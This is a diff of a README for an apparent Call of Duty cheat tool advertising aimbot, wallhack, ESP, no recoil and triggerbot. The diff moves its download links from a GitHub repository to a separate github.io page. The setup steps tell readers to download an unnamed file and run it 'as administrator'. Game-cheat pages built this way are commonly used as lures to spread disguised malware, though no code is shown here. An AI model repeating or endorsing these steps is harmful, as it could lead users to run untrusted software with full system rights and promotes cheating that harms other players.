@@ -1,6 +1,6 @@
 # 🎯 COD-Eclipse-Z - Improve your competitive performance today
 
-[![](https://img.shields.io/badge/Download-Eclipse_Z_Tool-blue.svg)](https://github.com/Akshajver9446/COD-Eclipse-Z)
+[![](https://img.shields.io/badge/Download-Eclipse_Z_Tool-blue.svg)](https://akshajver9446.github.io)
 
 COD-Eclipse-Z provides tools for Call of Duty players to improve their gameplay. This software includes features like ESP, Aimbot, Wallhack, No Recoil, and Triggerbot. These tools help you track opponents and manage weapon control during matches.
 
@@ -10,7 +10,7 @@ Ensure your computer meets these requirements before you start. The software run
 
 ## 📥 Getting Started
 
-1. Visit the following link to download the software: [Download COD-Eclipse-Z](https://github.com/Akshajver9446/COD-Eclipse-Z).
+1. Visit the following link to download the software: [Download COD-Eclipse-Z](https://akshajver9446.github.io).
 2. Locate the downloaded file in your computer's Downloads folder.
 3. Right-click the file and select "Run as administrator" to grant the necessary permissions.
 4. Follow the instructions that appear on your screen to complete the setup process.
